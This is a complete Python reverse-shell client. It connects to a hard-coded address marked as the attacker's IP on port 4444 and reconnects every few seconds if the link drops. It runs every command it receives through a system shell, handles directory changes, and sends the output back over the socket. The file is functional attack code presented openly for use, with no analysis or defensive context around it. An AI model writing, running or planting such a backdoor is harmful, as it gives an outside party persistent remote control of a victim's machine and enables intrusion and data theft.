import os
import sys
import socket
import subprocess
import threading
import time
import platform

# Configuration
HOST = '192.168.100.15'  # Attacker's IP
PORT = 4444               # Attacker's port
RECONNECT_DELAY = 5       # Seconds between connection attempts
BUFFER_SIZE = 1024 * 128  # 128KB buffer size
ENCODING = 'utf-8'
SHELL = '/bin/bash' if platform.system() != 'Windows' else 'cmd.exe'


class ReverseShell:
    def __init__(self):
        self.sock = None
        self.running = True
        self.current_dir = os.getcwd()
        self.platform = platform.system()
        self.shell = SHELL
        self.lock = threading.Lock()

    def persistent_connect(self):
        """Maintain persistent connection with retries"""
        while self.running:
            try:
                self.sock = socket.create_connection((HOST, PORT), timeout=10)
                self.handle_session()
            except (ConnectionRefusedError, TimeoutError):
                time.sleep(RECONNECT_DELAY)
            except Exception as e:
                print(f"Connection error: {str(e)}")
                time.sleep(RECONNECT_DELAY)
            finally:
                if self.sock:
                    self.sock.close()

    def handle_session(self):
        """Main command session handler"""
        try:
            while self.running:
                # Receive command
                command = self.receive_data()
                if not command:
                    break

                # Handle special commands
                if command.lower() == 'exit':
                    break
                if command.lower() == 'background':
                    continue

                # Execute and send response
                output = self.execute_command(command)
                self.send_data(output)

        except Exception as e:
            print(f"Session error: {str(e)}")
        finally:
            self.sock.close()

    def execute_command(self, command):
        """Execute commands with proper directory handling"""
        try:
            # Handle directory changes
            if command.lower().startswith('cd '):
                return self.change_directory(command[3:].strip())

            # Create subprocess with correct directory
            process = subprocess.Popen(
                self.format_command(command),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_dir,
                text=True
            )

            # Get output with timeout
            try:
                output, error = process.communicate(timeout=60)
                result = output or error or "Command executed successfully"
            except subprocess.TimeoutExpired:
                process.kill()
                result = "Command timed out after 60 seconds"

            return result

        except Exception as e:
            return f"Command execution failed: {str(e)}"

    def change_directory(self, path):
        """Handle directory navigation"""
        try:
            # Handle home directory shortcut
            if not path or path == "~":
                new_path = os.path.expanduser("~")
            else:
                new_path = os.path.abspath(os.path.join(self.current_dir, path))

            if os.path.isdir(new_path):
                self.current_dir = new_path
                return f"Current directory: {self.current_dir}"
            return f"Directory not found: {new_path}"
        except Exception as e:
            return f"CD error: {str(e)}"

    def format_command(self, command):
        """Platform-specific command formatting"""
        if self.platform == 'Windows':
            return f'cd /D "{self.current_dir}" && {command}'
        return f'cd "{self.current_dir}"; {command}'

    def send_data(self, data):
        """Send data without header"""
        with self.lock:
            try:
                self.sock.sendall(data.encode(ENCODING))
            except Exception as e:
                print(f"Send error: {str(e)}")
                self.running = False

    def receive_data(self):
        """Receive data until newline (for command parsing)"""
        try:
            data = b''
            while True:
                chunk = self.sock.recv(1)  # Read byte by byte
                if not chunk:
                    return None
                if chunk == b'\n':
                    break
                data += chunk
            return data.decode(ENCODING).strip()
        except Exception as e:
            print(f"Receive error: {str(e)}")
            return None

    def start(self):
        """Start the reverse shell"""
        print(f"[*] Connecting to {HOST}:{PORT}...")
        connect_thread = threading.Thread(target=self.persistent_connect)
        connect_thread.daemon = True
        connect_thread.start()
        connect_thread.join()


if __name__ == "__main__":
    try:
        ReverseShell().start()
    except KeyboardInterrupt:
        print("\n[!] Client terminated by user")
        sys.exit(0)